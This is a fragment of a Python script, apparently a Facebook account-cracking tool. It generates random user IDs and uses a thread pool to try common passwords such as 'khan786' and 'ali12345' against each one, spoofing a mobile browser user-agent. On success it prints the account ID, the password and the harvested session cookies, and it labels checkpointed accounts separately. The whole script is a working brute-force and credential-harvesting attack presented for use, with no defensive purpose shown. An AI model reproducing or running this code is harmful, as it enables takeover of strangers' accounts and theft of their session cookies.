...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/247.0.0.6.130;]"}
...
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mAPKI.BAJI 
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mAPKI.BAJI 
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mAPKI-BAJI-06
...
def random_number():
    ...
    with ThreadPool(max_workers=65) as yaari:
        ...
        for guru in uid:
            uid = kode+guru
            pwx = [guru,'khan786','khan1122','khan12','janjan','khan12345','khankhan123','ali786','ali12345']
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=9g-3ZqcAMpfH7zjZgphMvabV; sb=9g-3ZgdDSlOcIgvi6XuY945o; m_pixel_ratio=2; wd=360x684; fr=00Bc7i279kj9KUClf..Bmtw_2..AAA.0.0.Bmtw_5.AWUN5KGwR0A',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[BAJI-RAO -OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[BAJI-RAO -CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
